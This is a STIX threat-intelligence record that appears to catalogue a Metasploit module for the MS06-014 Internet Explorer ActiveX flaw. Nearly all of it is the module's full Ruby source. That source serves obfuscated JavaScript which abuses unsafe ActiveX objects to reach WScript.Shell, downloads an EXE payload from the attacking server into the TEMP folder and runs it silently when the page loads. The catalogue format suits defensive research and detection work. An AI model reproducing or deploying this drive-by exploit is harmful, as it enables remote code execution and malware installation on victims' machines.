{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb88a00b-634c-43ca-9cb2-cc0fd6f981a2",
    "created": "2024-08-14T16:44:00.192284Z",
    "modified": "2024-08-14T16:44:00.192288Z",
    "name": "MS06-014 Microsoft Internet Explorer COM CreateObject Code Execution",
    "description": " This module exploits a generic code execution vulnerability in Internet Explorer by abusing vulnerable ActiveX objects.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ie_createobject.rb",
            "external_id": "ie_createobject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0003"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-4704"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Seh\n  include Msf::Exploit::EXE\n\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({\n    :ua_name    => HttpClients::IE,\n    # In badly misconfigured situations, IE7 and 8 could be vulnerable to\n    # this, but by default they throw an ugly popup that stops all script\n    # execution until the user deals with it and aborts everything if they\n    # click \"no\".  Not worth the risk of being unable to try more recent\n    # exploits.  Make sure service packs on top of 6.0 are considered less\n    # than the max by setting to 6.1 (which doesn't really exist).\n    :ua_maxver  => \"6.1\",\n    :javascript => true,\n    :os_name    => OperatingSystems::Match::WINDOWS,\n    :method     => [ 'CreateObject', 'GetObject' ],\n    :classid    =>\n      [\n          '{BD96C556-65A3-11D0-983A-00C04FC29E36}',\n          '{BD96C556-65A3-11D0-983A-00C04FC29E30}',\n          '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}',\n          '{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}',\n          '{6414512B-B978-451D-A0D8-FCFDF33E833C}',\n          '{06723E09-F4C2-43c8-8358-09FCD1DB0766}',\n          '{639F725F-1B2D-4831-A9FD-874847682010}',\n          '{BA018599-1DB3-44f9-83B4-461454C84BF8}',\n          '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}',\n          '{E8CCCDDF-CA28-496b-B050-6C07C962476B}',\n          '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}',\n          '{0006F033-0000-0000-C000-000000000046}',\n          '{0006F03A-0000-0000-C000-000000000046}',\n      ],\n    #:rank => ExcellentRanking  # reliable exe writer\n  })\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-014 Microsoft Internet Explorer COM CreateObject Code Execution',\n      'Description'    => %q{\n          This module exploits a generic code execution vulnerability in Internet\n        Explorer by abusing vulnerable ActiveX objects.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hdm',\n        ],\n      'References'     =>\n        [\n          # MDAC\n          [ 'MSB', 'MS06-014' ],\n          [ 'CVE', '2006-0003' ],\n          [ 'OSVDB', '24517' ],\n          # WMI Object Broker\n          [ 'MSB', 'MS06-073' ],\n          [ 'CVE', '2006-4704' ],\n          [ 'OSVDB', '30155' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n\n          # Patched\n          [ 'MS06-014 - RDS.DataSpace',                     { 'CLSID' => '{BD96C556-65A3-11D0-983A-00C04FC29E36}'} ],\n          # Found in mpack\n          [ 'MS06-014 - RDS.DataSpace',                     { 'CLSID' => '{BD96C556-65A3-11D0-983A-00C04FC29E30}'} ],\n\n          # Patched\n          [ 'MS06-073 - WMIScriptUtils.WMIObjectBroker2.1', { 'CLSID' => '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}'} ],\n\n          # These are restricted by site (might be exploitable via DNS spoofing + SSL fun)\n          [ 'UNKNOWN  - SoftwareDistribution.MicrosoftUpdateWebControl.1', { 'CLSID' => '{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}'} ],\n          [ 'UNKNOWN  - SoftwareDistribution.WebControl.1', { 'CLSID' => '{6414512B-B978-451D-A0D8-FCFDF33E833C}'} ],\n\n          # Visual Studio components, not marked as safe\n          [ 'UNKNOWN  - VsmIDE.DTE',                        { 'CLSID' => '{06723E09-F4C2-43c8-8358-09FCD1DB0766}'} ],\n          [ 'UNKNOWN  - DExplore.AppObj.8.0',               { 'CLSID' => '{639F725F-1B2D-4831-A9FD-874847682010}'} ],\n          [ 'UNKNOWN  - VisualStudio.DTE.8.0',              { 'CLSID' => '{BA018599-1DB3-44f9-83B4-461454C84BF8}'} ],\n          [ 'UNKNOWN  - Microsoft.DbgClr.DTE.8.0',          { 'CLSID' => '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}'} ],\n          [ 'UNKNOWN  - VsaIDE.DTE',                        { 'CLSID' => '{E8CCCDDF-CA28-496b-B050-6C07C962476B}'} ],\n\n          #\n          # The controls below can launch the \"installing component\" dialogs...\n          #\n\n          # Not marked as safe\n          [ 'UNKNOWN  - Business Object Factory ',          { 'CLSID' => '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}'} ],\n\n          # Not marked as safe\n          [ 'UNKNOWN  - Outlook Data Object',               { 'CLSID' => '{0006F033-0000-0000-C000-000000000046}'} ],\n\n          # Found exploitable in the wild (no details)\n          [ 'UNKNOWN  - Outlook.Application',               { 'CLSID' => '{0006F03A-0000-0000-C000-000000000046}'} ],\n\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-04-11'))\n  end\n\n  def on_request_uri(cli, request)\n\n    if (request.uri.match(/payload/))\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending EXE payload\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    # Build out the HTML response page\n    var_html           = rand_text_alpha(rand(30)+2)\n    var_func_exploit   = rand_text_alpha(rand(30)+2);\n    var_func_go        = rand_text_alpha(rand(30)+2);\n    var_func_createo   = rand_text_alpha(rand(30)+2);\n    var_exe_name       = rand_text_alpha(rand(30)+2);\n    var_objects = ''\n\n    # Build the object list based on target selection\n    if (target.name == 'Automatic')\n      targets.each do |t|\n        next if not t['CLSID']\n        var_objects += t['CLSID'].unpack('C*').map{|c| \" '#{c.chr}' \"}.join(\"+\") + \",\"\n      end\n    else\n      var_objects += target['CLSID'].unpack('C*').map{|c| \" '#{c.chr}' \"}.join(\"+\") + \",\"\n    end\n\n\n    content = %Q^\n<html><head><title></title>\n<script language=\"javascript\">\n\nfunction #{var_func_createo}( o , n ) {\n  var r = null;\n\n  try { eval(\"r=o\" + \".C\" + \"re\" + \"ate\" + \"Ob\" + \"je\" + \"ct(n)\" ) }catch(e){}\n\n  if (! r) {\n    try { eval(\"r=o\" + \".Cr\" + \"ea\" + \"teO\" + \"bj\" + \"ect(n,'')\" ) }catch(e){}\n  }\n\n  if (! r) {\n    try { eval(\"r=o\" + \".Cr\" + \"ea\" + \"teO\" + \"bj\" + \"ect(n,'','')\" ) }catch(e){}\n  }\n\n  if (! r) {\n    try { eval(\"r=o\" + \".Ge\" + \"tOb\" + \"je\" + \"ct('',n)\" ) }catch(e){}\n  }\n\n  if (! r) {\n    try { eval(\"r=o\" + \".Ge\" + \"tOb\" + \"ject(n,'')\" ) }catch(e){}\n  }\n\n  if (! r) {\n    try { eval(\"r=o\" + \".Ge\" + \"tOb\" + \"ject(n)\" ) }catch(e){}\n  }\n\n  return( r );\n}\n\nfunction #{var_func_go}( a ) {\n\n  var s = #{var_func_createo}( a, \"W\" + \"Sc\" + \"ri\" + \"pt\" + \".S\" + \"he\" + \"ll\" );\n\n  var o = #{var_func_createo}( a, \"A\" + \"DO\" + \"D\" + \"B.S\" + \"tr\" + \"eam\" );\n\n  var e = s.Environment( \"P\" + \"ro\" + \"ce\" + \"ss\" );\n\n\n  var url = document.location + '/p' + 'ay' + 'lo' + 'ad';\n  var xml = null;\n  var bin = e.Item( \"T\" + \"E\" + \"M\" + \"P\" ) + \"\\\\\\\\#{var_exe_name}\" + \".e\" + \"xe\";\n  var dat;\n\n  try { xml=new XMLHttpRequest(); }\n  catch(e) {\n    try { xml = new ActiveXObject(\"Microsoft.XMLHTTP\"); }\n    catch(e) {\n      xml = new ActiveXObject(\"MSXML2.ServerXMLHTTP\");\n    }\n  }\n\n  if (! xml) {\n    return(0);\n  }\n\n  xml.open(\"GET\", url, false);\n  xml.send(null);\n  dat = xml.responseBody;\n\n  o.Type = 1 ;\n  o.Mode = 3 ;\n  o.Open ( ) ;\n  o.Write ( dat ) ;\n  o.SaveToFile ( bin, 2) ;\n\n  s.Run ( bin , 0 );\n}\n\nfunction #{var_func_exploit}( ) {\n  var i = 0;\n  var t = new Array( #{var_objects} null );\n\n  while (t[i]) {\n    var a = null;\n\n    if (t[i].substring(0,1) == '{') {\n      a = document.createElement(\"object\");\n      a.setAttribute(\"cl\" + \"as\" + \"sid\", \"cl\" + \"s\" + \"id\" +\":\" + t[i].substring( 1, t[i].length - 1 ) ) ;\n    } else {\n      try { a = new ActiveXObject(t[i]); } catch(e){}\n    }\n\n    if (a) {\n      try {\n        var b = #{var_func_createo}( a , \"W\" + \"Sc\" + \"ri\" + \"pt\" + \".S\" + \"he\" + \"ll\" ) ;\n        if (b) {\n          #{var_func_go}( a ) ;\n          return(0) ;\n        }\n      } catch(e){\n      }\n    }\n    i++;\n  }\n}\n</script>\n</head>\n<body onload='#{var_func_exploit}()'>\n#{var_html}\n</body>\n</html>\n\n^\n\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending exploit HTML...\")\n\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-04-11",
    "x_mitre_platforms": [
        "win'"
    ]
}